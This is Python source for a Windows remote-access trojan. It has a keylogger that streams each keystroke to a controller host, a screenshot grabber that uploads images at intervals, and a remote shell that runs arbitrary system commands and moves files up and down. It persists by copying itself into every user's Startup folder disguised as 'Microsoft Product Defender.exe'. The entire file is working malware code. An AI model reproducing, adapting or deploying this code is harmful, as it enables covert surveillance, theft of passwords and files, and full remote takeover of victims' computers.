import pyHook,pythoncom,sys,logging
import socket
from threading import Thread
from time import sleep
import autopy
import os
import shutil
import inspect
import atexit
import multiprocessing
from multiprocessing import forking

# for getting error log
try:
    sys.stderr = open("D:\my_stderr.log", "w")
except:
    pass


# multi process making class    
class _Popen(forking.Popen):
    def __init__(self, *args, **kw):
        if hasattr(sys, 'frozen'):
            os.putenv('_MEIPASS2', sys._MEIPASS)
        try:
            super(_Popen, self).__init__(*args, **kw)
        finally:
            if hasattr(sys, 'frozen'):
                os.unsetenv('_MEIPASS2')


class Process(multiprocessing.Process):
    _Popen = _Popen


# to go back in directory (this will give effect of cd..)
def back_dir():
    path=os.getcwd()
    print path
    s=path.split('\\')
    length=len(s)
    x=0
    
    while x<(length-1):
        if x==0:
            back_path=s[x]+"\\"
        else:
            back_path=back_path+s[x]+"\\"
        x+=1

    os.chdir(back_path)

#first type of attack --> key logger
def attack1():
        server1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        loop1='on'
        while loop1=='on':
                try:
                        sleep(1)
                        server1.connect((ip,10000))
                        loop1='off'
                except:
                        pass
        def OnKeyboardEvent(event):
                k=chr(event.Ascii)
                server1.send(k)
                #print str(k)
                return None
            
        hooks_manager=pyHook.HookManager()
        hooks_manager.KeyDown=OnKeyboardEvent
        hooks_manager.HookKeyboard()
        pythoncom.PumpMessages()
###############################attack 1 over####################################3
        

def attack2():
        server3=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        loop3='on'
        while loop3=='on':
                try:
                        sleep(1)
                        server3.connect((ip,4444))
                        loop3='off'
                except:
                        pass
                time_interval=3
                try:
                        time_interval=server3.recv(1024)
                except:
                        pass
        
                while True:
                        sleep(float(time_interval))
                        bitmap=autopy.bitmap.capture_screen()
                        bitmap.save('1.png')
                        with open('1.png','rb') as f:
                                bytes_to_send=f.read(1024)
                                
                                server3.send(bytes_to_send)
                                
                                while bytes_to_send !="":
                                        bytes_to_send=f.read(1024)
                                        if bytes_to_send=="":
                                                server3.send('stop it')
                                                
                                        else:
                                                server3.send(bytes_to_send)
                        
  ######################## attack 2 over ###########################

def attack3():
        server4=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        loop4='on'
        while loop4=='on':
                try:
                        sleep(1)
                        server4.connect((ip,10008))
                        loop4='off'
                except:
                        pass

        while True:
                command=server4.recv(1024)
                #print command
                if command=="cd..":
                        try:
                                back_dir(os.getcwd())
                        except:
                                pass
                elif command[:3]=="cd ":
                        try:
                                os.chdir(command[3:])
                        except:
                                pass
                elif command=="ls":
                        data=os.listdir(os.getcwd())
                        i=0
                        d=''
                        while i<len(data):
                                d=d+'$$%%'+data[i]
                                #print len(data)
                                i+=1
                                
                        server4.send(d)

                elif command[:4]=="get ":
                        f=open(command[4:],'rb')
                        size=os.path.getsize(command[4:])
                        server4.send(str(size))
                        data=f.read(2048)
                        server4.send(data)
                        while data!="":
                                data=''
                                data=f.read(2048)
                                if data=="":
                                        server4.send('stop it')
                                else:
                                        server4.send(data)
                                
        
                elif command[:6]=="mkdir ":
                        os.mkdir(command[6:])

                elif command[:7]=="upload ":
                        size=server4.recv(1024)
                        data=server4.recv(2048)
                        while data[-7:]!='stop it':
                                f=open(command[7:],'ab')
                                f.write(data)
                                f.close()
                                data=''
                                data=server4.recv(2048)
                elif command=="pwd":
                        path=os.getcwd()
                        server4.send(path)

                elif command[:5]=="del_d":
                        try:
                                os.rmtree(command[6:])
                        except:
                                pass

                elif command[:5]=="del_f":
                        try:
                                os.remove(command[6:])
                                
                        except:
                                pass

                elif command=="shutdown":
                        os.system('shutdown -s')
                        

                elif command[:4]=="cmd ":
                        try:
                                print command[4:]
                                os.system(command[4:])
                        except:
                                pass
                        
                        
                                                


# if virus is running
def if_startup():
        server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        #waiting for connection from server
        loop='on'
        while loop=='on':
                try:
                        sleep(1)
                        server.connect((ip,8081))
                        loop='off'
                except:
                        pass


        count=0
        server2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server6=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        while True:
                if count==1:
                        loop0='on'
                        while loop0=='on':
                                try:
                                        sleep(1)
                                        server2.connect((ip,8081))
                                        option=server2.recv(1024)
                                
                                        loop0='off'
                                except:
                                        pass
                        count=2
                        
                        
                elif count==0:
                        option=server.recv(1024)
                        count=1

                elif count==2:
                        loop6='on'
                        while loop6=='on':
                                try:
                                        print "done"
                                        sleep(1)
                                        server6.connect((ip,8081))
                                        option=server6.recv(1024)
                                
                                        loop6='off'
                                except:
                                        pass
                        count=1
                
        
                if option=='1':
                        t=Thread(target=attack1)
                        t.start()
                


                elif option=='2':
                        t=Thread(target=attack2)
                        t.start()

                elif option=='3':
                        t=Thread(target=attack3)
                        t.start()
                


if os.getcwd()[-7:]=="Startup": #if exploit run successfully from startup folder
        atexit.register(if_startup)#start exploit
        
else:           #first copy exploit to startup then run as defender.exe
        try:
            
            s=os.getcwd()
            fi=inspect.stack()[0][1]
            present_file=fi.split('/')
            source=str(s)+'\\'+present_file[-1][:-2]+'exe'
            dest="Microsoft Product Defender.exe"
            os.chdir('C:\\Users')
            hostlist=os.listdir('.')
            for i in hostlist:
                try:
                    os.chdir('C:\Users\\'+str(i)+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
                    shutil.copy2(source,dest)
                    f=open('windows.bat','w')
                    f.write('@echo off\n')
                    f.write('"Microsoft Product Defender.exe"')
                    f.close()
                    
        
                except:
                    pass
        except:
            pass
        
        atexit.register(if_startup)
